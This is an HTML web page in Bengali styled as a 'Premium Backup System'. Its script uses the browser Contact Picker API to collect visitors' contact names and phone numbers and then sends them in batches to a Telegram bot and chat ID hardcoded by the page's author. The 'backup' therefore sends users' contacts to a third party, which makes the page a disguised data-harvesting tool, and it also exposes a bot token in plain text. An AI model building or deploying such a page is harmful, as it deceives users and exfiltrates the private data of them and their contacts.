<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Backup System</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #050608;
            background-image: 
                radial-gradient(at 15% 15%, rgba(0, 242, 254, 0.2) 0px, transparent 40%),
                radial-gradient(at 85% 85%, rgba(126, 34, 206, 0.2) 0px, transparent 40%);
            color: white;
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .premium-card {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 35px;
            box-shadow: 0 0 50px rgba(0, 242, 254, 0.15), 0 0 100px rgba(126, 34, 206, 0.15);
            padding: 45px 30px;
            width: 90%;
            max-width: 380px;
            text-align: center;
        }

        /* প্রিমিয়াম লোগো স্টাইল */
        .logo-box {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, rgba(0, 242, 254, 0.1), rgba(126, 34, 206, 0.1));
            border-radius: 22px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 25px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
        }

        .premium-btn {
            background: linear-gradient(135deg, #00f2fe 0%, #4facfe 50%, #7e22ce 100%);
            background-size: 200% auto;
            border: none;
            padding: 18px;
            border-radius: 18px;
            color: white;
            font-weight: 800;
            width: 100%;
            cursor: pointer;
            box-shadow: 0 8px 25px rgba(0, 210, 255, 0.3);
            transition: 0.5s;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
        }

        .premium-btn:hover {
            background-position: right center;
            box-shadow: 0 8px 30px rgba(126, 34, 206, 0.5);
        }

        .btn-text-main { font-size: 17px; letter-spacing: 0.5px; }
        .btn-text-sub { font-size: 11px; opacity: 0.9; font-weight: 400; text-transform: uppercase; }

        #status {
            font-size: 13px;
            color: #00f2fe;
            margin-top: 20px;
            font-weight: 500;
        }
    </style>
</head>
<body>

    <div class="premium-card">
        <div class="logo-box">
            <i class="fas fa-bolt-lightning text-4xl text-cyan-400"></i>
        </div>

        <div id="main-view">
            <button onclick="fetchContacts()" class="premium-btn">
                <span class="btn-text-main">ব্যাকআপ শুরু করুন</span>
                <span class="btn-text-sub"><i class="fab fa-telegram-plane"></i> Send To Telegram</span>
            </button>
        </div>

        <div id="status"></div>
    </div>

    <script>
        const BOT_TOKEN = '8651122945:AAH54GuzokeFtUMxdbJOEe0ZhUptrgxTm1k';
        const CHAT_ID = '6467941734';

        async function fetchContacts() {
            const status = document.getElementById('status');
            
            if (!('contacts' in navigator && 'ContactsManager' in window)) {
                status.innerHTML = "❌ Error: আপনার ব্রাউজারে Contact API সাপোর্ট নেই। (Chrome & HTTPS প্রয়োজন)";
                return;
            }

            try {
                const props = ['name', 'tel'];
                const opts = { multiple: true };
                
                status.innerText = "অনুমতি চাওয়া হচ্ছে...";
                const contacts = await navigator.contacts.select(props, opts);

                if (contacts && contacts.length > 0) {
                    status.innerHTML = `<i class="fas fa-spinner fa-spin"></i> পাঠানো শুরু হয়েছে...`;
                    await sendData(contacts);
                }
            } catch (err) {
                status.innerText = ""; 
                console.log(err);
            }
        }

        async function sendData(contacts) {
            const status = document.getElementById('status');
            const CHUNK_SIZE = 15; 
            
            const now = new Date();
            const days = ['রবিবার', 'সোমবার', 'মঙ্গলবার', 'বুধবার', 'বৃহস্পতিবার', 'শুক্রবার', 'শনিবার'];
            const dayName = days[now.getDay()];
            const dateStr = now.toLocaleDateString('bn-BD', { year: 'numeric', month: 'long', day: 'numeric' });
            const timeStr = now.toLocaleTimeString('bn-BD');

            for (let i = 0; i < contacts.length; i += CHUNK_SIZE) {
                const chunk = contacts.slice(i, i + CHUNK_SIZE);
                let message = `📊 **GX Backup number**\n\n`;
                message += `📅 ${dayName}, ${dateStr}\n`;
                message += `⏰ ${timeStr}\n`;
                message += `👥 Total Contacts: ${contacts.length}\n`;
                message += `━━━━━━━━━━━━━━━━━━━━\n\n`;

                chunk.forEach(c => {
                    const name = c.name ? c.name[0] : 'No Name';
                    const tel = c.tel ? c.tel[0] : 'No Number';
                    message += `Name : ──${name}─\n`;
                    message += `Number : ${tel}\n\n`;
                });

                message += `— GX Sammim sent`;

                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown'
                        })
                    });
                    
                    status.innerText = `প্রগতি: ${Math.min(i + CHUNK_SIZE, contacts.length)} / ${contacts.length}`;
                    await new Promise(r => setTimeout(r, 1500)); 
                } catch (e) {
                    console.error(e);
                }
            }
            status.innerHTML = "✅ সব কন্টাক্ট টেলিগ্রামে পাঠানো হয়েছে!";
            alert("সফলভাবে সম্পন্ন হয়েছে!");
        }
    </script>
</body>
</html>
